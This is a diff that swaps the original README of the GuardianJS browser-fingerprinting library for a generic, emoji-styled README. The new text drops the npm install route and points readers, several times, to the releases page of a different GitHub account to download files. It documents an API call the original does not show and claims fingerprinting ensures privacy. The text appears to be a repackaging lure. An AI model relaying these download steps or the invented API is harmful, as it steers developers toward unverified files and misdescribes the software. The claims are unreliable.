@@ -1,156 +1,98 @@
-<p align="center">
-  <img src="https://docs.guardianstack.ai/~gitbook/image?url=https%3A%2F%2F2591170659-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Forganizations%252Fj0iZplCciv5tsyDcHsM9%252Fsites%252Fsite_ybMcO%252Flogo%252FVBUIS0oHSzNfnPE8vjTO%252FTrademark-Guardian-dimensioni-piccole.svg%3Falt%3Dmedia%26token%3Dd7739b50-0ff6-4388-b7dd-55f0b20b77fb&width=260&dpr=4&quality=100&sign=23a43e03&sv=2" alt="GuardianJS Logo" width="200">
-</p>
+# 🎉 guardianjs - Easy Browser Fingerprinting Made Simple
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@guardianstack/guardianjs-free">
-    <img src="https://img.shields.io/npm/v/@guardianstack/guardianjs-free?style=flat-square&color=blue" alt="NPM Version">
-  </a>
-  <a href="https://www.npmjs.com/package/@guardianstack/guardianjs-free">
-    <img src="https://img.shields.io/npm/dm/@guardianstack/guardianjs-free?style=flat-square" alt="NPM Downloads">
-  </a>
-  <a href="https://bundlephobia.com/package/@guardianstack/guardianjs-free">
-    <img src="https://img.shields.io/bundlephobia/minzip/@guardianstack/guardianjs-free?style=flat-square" alt="Bundle Size">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/npm/l/@guardianstack/guardianjs-free?style=flat-square" alt="License">
-  </a>
-  <a href="https://www.typescriptlang.org/">
-    <img src="https://img.shields.io/badge/TypeScript-Ready-3178C6?style=flat-square&logo=typescript&logoColor=white" alt="TypeScript">
-  </a>
-</p>
+## 📥 Download Now
+[![Download guardianjs](https://img.shields.io/badge/Download-guardianjs-blue)](https://github.com/yassine-espada/guardianjs/releases)
 
-<p align="center">
-  Open-source, purely client-side browser fingerprinting that computes a stable <strong>anchor-based visitor identifier</strong> without any API keys or backend calls.
-</p>
+## 🚀 Getting Started
+This guide will help you download and run the guardianjs application easily. Whether you are a beginner or just want a quick way to set this up, follow these simple steps.
 
-### What is GuardianJS?
+## 📦 What is guardianjs?
+guardianjs is an open-source library designed to help websites identify users without using backend systems or requiring API keys. It runs entirely in your browser, making it lightweight and efficient.
 
-GuardianJS is a lightweight library that:
+### Key Features
+- Generates stable visitor IDs based on browser fingerprints.
+- Works entirely client-side, ensuring privacy.
+- Easy to integrate into any web application.
 
-- **Collects rich browser and device signals** via the Guardian JS Agent.
-- **Builds a stable “anchor” signature** from GPU/WebGL, hardware, audio, math, and timing signals.
-- **Hashes the anchor into a `visitorId`** that stays reasonably stable across sessions and incognito mode on the same device.
+## 🖥️ System Requirements
+To run guardianjs, you only need:
+- A modern web browser (Chrome, Firefox, Safari, or Edge).
+- Internet connection for downloading the library.
 
-Everything runs **entirely in the browser** – no data is sent to Guardian, and no Guardian API key is required.
+## 📥 Download & Install
+To get started, you'll need to visit the Releases page to download guardianjs. 
 
-> **Note**: GuardianJS Free is designed for experimentation, prototyping, and low-risk use cases. For production-grade fraud prevention and far fewer false positives, you should use **Guardian Pro** instead (see below).
+1. Click on the link below to go to the Releases page:
+   - [Download guardianjs](https://github.com/yassine-espada/guardianjs/releases)
+  
+2. On the Releases page, look for the latest version. It will have the highest number (e.g., v1.0.0).
 
-### Demo
+3. Click on the version to expand it. You will see several files available for download. 
 
-Visit [GuardianJS vs Guardian Pro Demo](https://demo.guardianstack.ai) to see your visitor identifier.
+4. Select the file that best suits your needs. For most users, the recommended file will be sufficient.
 
-Now, try visiting the same page in private / incognito mode and notice how the visitor identifier remains the **same**!
+5. Click on the file link to download. 
 
-### Installation
+6. Once the download finishes, locate the file in your downloads folder.
 
-```bash
-npm install @guardianstack/guardianjs-free
+7. You can now run guardianjs directly in your browser by including the script in your HTML file.
+
+## 🛠️ How to Use guardianjs in Your Project
+To integrate guardianjs into your web application, follow these steps:
+
+1. Open your project in a code editor.
+2. In your HTML file, add the following line in the `<head>` section:
+   ```html
+   <script src="path/to/guardianjs.js"></script>
+   ```
+   Replace `path/to/guardianjs.js` with the actual path to the downloaded file.
+
+3. Use the following JavaScript to create visitor IDs:
+   ```javascript
+   const visitorId = guardianjs.generateVisitorId(); // This will generate a unique ID
+   console.log(visitorId);
+   ```
+4. Save your changes and open your HTML file in your web browser.
+
+5. You should see the generated visitor ID in the console.
+
+## 🔍 Example Usage
+Here’s a simple example of how to use guardianjs in a webpage:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>guardianjs Example</title>
+    <script src="path/to/guardianjs.js"></script>
+</head>
+<body>
+    <h1>Welcome to my website!</h1>
+    <script>
+        const visitorId = guardianjs.generateVisitorId();
+        console.log(`Your unique visitor ID is: ${visitorId}`);
+    </script>
+</body>
+</html>
 ```
 
-or
+## 📞 Need Help?
+If you have questions or need assistance, check the Issues section in the repository. You can also reach out by creating a new issue there.
 
-```bash
-yarn add @guardianstack/guardianjs-free
-```
+## 📝 Contributing
+This project welcomes contributions. If you'd like to help improve guardianjs, feel free to submit a pull request or create an issue.
 
-### Basic usage
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/yassine-espada/guardianjs)
+- [Documentation](https://github.com/yassine-espada/guardianjs/blob/main/docs/README.md)
 
-GuardianJS mirrors the ergonomics of popular fingerprinting libraries: you **load** the agent once, then **get** the visitor identifier when needed.
+## 🌈 Community
+Join us in our community discussion to share ideas and improvements. We value user feedback and encourage all to participate.
 
-```ts
-import GuardianJS from "@guardianstack/guardianjs-free";
+## 📚 License
+guardianjs is open-source and available under the MIT License. You can use it freely in your projects.
 
-// Initialize GuardianJS at application startup
-const guardianPromise = GuardianJS.load({ debug: false });
-
-// Later, when you need a visitor identifier
-guardianPromise
-  .then((agent) => agent.get())
-  .then((result) => {
-    // Stable, anchor-based visitor identifier
-    const visitorId = result.visitorId;
-
-    // Structured anchor payload (GPU/WebGL/hardware/audio/math/timing)
-    const anchor = result.anchor;
-
-    // Full browser signals as collected by the Guardian JS Agent
-    const signals = result.signals;
-
-    console.log("visitorId", visitorId);
-  });
-```
-
-#### API surface
-
-- **`load(options?: LoadOptions): Promise<Agent>`**
-  - **`debug?: boolean`**: when true, `agent.get()` will print timing and anchor details to the console.
-- **`Agent.get(options?: GetOptions): Promise<GetResult>`**
-  - **`GetResult.visitorId: string`**: the anchor-based visitor identifier.
-  - **`GetResult.anchor: Record<string, unknown>`**: normalized anchor payload.
-  - **`GetResult.signals: BrowserSignals`**: raw browser signals from the Guardian JS Agent.
-  - **`GetResult.version: string`**: GuardianJS library version.
-
-GuardianJS Free never attempts to contact the Guardian backend – it only reads browser APIs and computes identifiers locally.
-
-### Limitations
-
-#### Accuracy
-
-Since GuardianJS Free processes and generates the fingerprints from within the browser itself, the accuracy is significantly lower than in the commercial version. Different users with identical hardware/software setups may share the same `visitorId`.
-
-#### Security
-
-Because the fingerprints are processed and generated entirely on the client, they are vulnerable to spoofing, replay attacks, and reverse engineering.
-
-### Industry-leading accuracy with Guardian Pro
-
-The main difference between GuardianJS Free and **Guardian Pro** lies in the number of attributes collected, how they are processed, and the accuracy in identifying visitors.
-
-Guardian Pro is a **closed-source, commercial** device intelligence platform designed to prevent fraud and improve user experiences. It is an enhanced version of the open-source strategy and has been fully re-designed to solve the most challenging identification use cases.
-
-Unlike GuardianJS Free, Guardian Pro achieves **industry-leading accuracy** because it:
-
-- Processes browser attributes on the server to verify integrity.
-- Analyzes vast amounts of auxiliary data (IP addresses, ASN, network routes, time-of-visit patterns).
-- Uses advanced fuzzy matching to reliably deduplicate different visitors that have identical devices.
-- Detects bots, automation tools, and spoofing attempts.
-
-Guardian Pro is available for Web and native platforms. You can easily get started by signing up for a free trial.
-
-### GuardianJS Free vs. Guardian Pro
-
-The table below compares and contrasts these two products:
-
-| Feature                                        |       GuardianJS Free       |       Guardian Pro        |
-| :--------------------------------------------- | :-------------------------: | :-----------------------: |
-| **Core Identification**                        |                             |                           |
-| Basic signals (screen, OS, device)             |              ✓              |             ✓             |
-| Advanced signals (canvas, audio, fonts, WebGL) |              -              |             ✓             |
-| **Smart Signals (Output)**                     |                             |                           |
-| Bot detection & automation scoring             |              -              |             ✓             |
-| VPN / Proxy / Tor detection                    |              -              |             ✓             |
-| Browser tampering detection                    |              -              |             ✓             |
-| Incognito mode detection                       |              -              |             ✓             |
-| **Identifier Properties**                      |                             |                           |
-| ID Type                                        |  Hash of local attributes   | Server-verified VisitorID |
-| ID Lifetime                                    | Weeks (unstable on updates) |      Months / Years       |
-| ID Origin                                      |      Client-side only       |       Server-issued       |
-| ID Collisions                                  |  Common on similar devices  |         Very rare         |
-| **Advanced Features**                          |                             |                           |
-| Webhooks & Realtime API                        |              -              |             ✓             |
-| Geolocation (IP-based)                         |              -              |             ✓             |
-| Risk Scoring & Trust Labels                    |              -              |             ✓             |
-| **Operations**                                 |                             |                           |
-| Data Security                                  |     Your responsibility     |     Encrypted at rest     |
-| Support                                        |        GitHub Issues        |     Dedicated Support     |
-
-👉 **If you care about minimizing false positives and reliably catching bad actors, Guardian Pro is what you want in production.**
-
-You can get started in minutes by signing up at:  
-**[https://dashboard.guardianstack.ai](https://dashboard.guardianstack.ai)**
-
-### License and contributions
-
-- **License**: GuardianJS is released under the MIT license (see `LICENSE`).
-- **Contributions**: Issues and pull requests are welcome. If you plan a significant change, consider opening an issue first to discuss the approach.
+## 📥 Download Now
+Make sure to [download guardianjs](https://github.com/yassine-espada/guardianjs/releases) to start generating visitor IDs today!
